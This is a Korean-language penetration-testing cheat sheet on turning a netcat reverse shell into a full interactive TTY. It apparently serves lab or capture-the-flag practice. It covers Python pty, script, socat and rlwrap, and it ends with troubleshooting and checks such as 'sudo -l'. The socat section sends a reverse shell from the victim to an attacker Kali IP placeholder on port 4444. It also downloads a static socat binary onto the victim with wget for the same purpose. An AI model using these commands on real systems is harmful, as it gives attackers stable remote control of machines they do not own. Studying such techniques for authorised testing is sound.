# 쉘 업그레이드 (TTY)

nc로 받은 쉘은 불완전한 TTY 상태. Ctrl+C 누르면 쉘 자체가 죽고, sudo/su, vi/nano, 자동완성, 방향키 등이 작동하지 않음. 권한상승을 위해 반드시 업그레이드 필요.

---

## 방법 1: Python PTY (가장 보편적)

```bash
# 1단계: PTY 스폰
python3 -c 'import pty; pty.spawn("/bin/bash")'

# python3 없으면
python -c 'import pty; pty.spawn("/bin/bash")'
python2 -c 'import pty; pty.spawn("/bin/bash")'

# bash 없으면 sh
python3 -c 'import pty; pty.spawn("/bin/sh")'

# 2단계: Ctrl+Z (백그라운드로 이동)

# 3단계: 칼리 터미널에서 설정 변경
stty raw -echo; fg

# 4단계: 쉘로 복귀 후 환경 설정 (Enter 치면 쉘 나옴)
export TERM=xterm
export SHELL=bash

# 터미널 크기 맞추기
# 먼저 칼리에서 크기 확인: stty size (예: 50 200)
stty rows 50 columns 200
```

---

## 방법 2: script

```bash
script /dev/null -c bash
# 또는
/usr/bin/script -qc /bin/bash /dev/null

# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## 방법 3: socat (가장 완전한 TTY, 사전 준비 필요)

```bash
# 칼리에서 리스너 (일반 nc 대신)
socat file:`tty`,raw,echo=0 tcp-listen:4444

# 피해자에서 (socat 바이너리 필요)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<칼리IP>:4444

# 피해자에 socat 없으면 정적 바이너리 업로드
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<칼리IP>:4444
```

---

## 방법 4: rlwrap (리스너에서 편의성 향상)

완전한 TTY는 아니지만 방향키, 히스토리가 작동

```bash
rlwrap nc -lvnp 4444
```

## 사용 가능한 쉘 확인

```bash
which bash sh zsh fish ksh
cat /etc/shells
ls /bin/*sh /usr/bin/*sh
```

---

## 문제 해결

```bash
# stty raw 상태에서 쉘이 죽은 경우 (터미널이 이상해짐)
reset                  # 터미널 리셋
stty sane              # 터미널 정상화

# python 없을 때 대안
perl -e 'exec "/bin/bash"'
ruby -e 'exec "/bin/bash"'
lua -e 'os.execute("/bin/bash")'
echo os.system('/bin/bash') | ruby -irb
/bin/sh -i
```

## 업그레이드 후 확인

```bash
# TTY 여부 확인
tty                    # /dev/pts/0 같이 나오면 성공
echo $TERM             # xterm 이면 OK

# sudo 사용 가능 여부
sudo -l                # TTY 업그레이드 후에만 작동

# 화면 지우기 작동 여부
clear
```
